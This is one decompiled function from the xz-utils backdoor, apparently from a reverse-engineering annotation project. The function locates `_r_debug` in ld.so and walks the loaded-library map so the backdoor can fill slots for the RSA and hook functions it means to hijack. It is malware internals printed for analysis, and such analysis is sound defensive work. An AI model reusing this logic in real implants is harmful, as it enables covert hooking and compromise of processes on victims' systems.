// /home/kali/xzre-ghidra/xzregh/104A40_process_shared_libraries.c
// Function: process_shared_libraries @ 0x104A40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries(backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Resolves `_r_debug` out of ld.so, sanity-checks `_r_debug.r_version`, and then feeds a stack-resident copy of `backdoor_shared_libraries_data_t` into `process_shared_libraries_map` to walk `r_map`. Successful scans populate the shared `backdoor_data_t` blob plus the caller-provided PLT/import slots so later stages never have to touch `_r_debug` again.
 */

#include "xzre_types.h"

BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)

{
  BOOL success;
  Elf64_Sym *r_debug_symbol;
  uchar *r_debug_addr;
  backdoor_shared_libraries_data_t tmp_state;
  
  // AutoDoc: Use the versioned `_r_debug` export so we never read the wrong struct layout.
  r_debug_symbol = elf_symbol_get(data->elf_handles->ldso,STR_r_debug,STR_GLIBC_2_2_5);
  success = FALSE;
  if (r_debug_symbol != (Elf64_Sym *)0x0) {
    tmp_state.elf_handles = data->elf_handles;
    // AutoDoc: Turn the symbol value into a runtime pointer before inspecting the version word and `r_map`.
    r_debug_addr = (tmp_state.elf_handles)->ldso->elfbase->e_ident + r_debug_symbol->st_value;
    success = FALSE;
    // AutoDoc: Sanity-check `_r_debug.r_version` (expected 1) before dereferencing `r_map`.
    if (0 < *(int *)r_debug_addr) {
      tmp_state.shared_maps = data->shared_maps;
      tmp_state.rsa_public_decrypt_slot = data->rsa_public_decrypt_slot;
      tmp_state.evp_set1_rsa_slot = data->evp_set1_rsa_slot;
      tmp_state.rsa_get0_key_slot = data->rsa_get0_key_slot;
      tmp_state.hooks_data_slot = data->hooks_data_slot;
      tmp_state.libc_imports = data->libc_imports;
      // AutoDoc: Work on a stack scratch copy so the caller’s struct only updates when the scan succeeds.
      success = process_shared_libraries_map(*(link_map **)(r_debug_addr + 8),&tmp_state);
      success = (BOOL)(success != FALSE);
    }
  }
  return success;
}

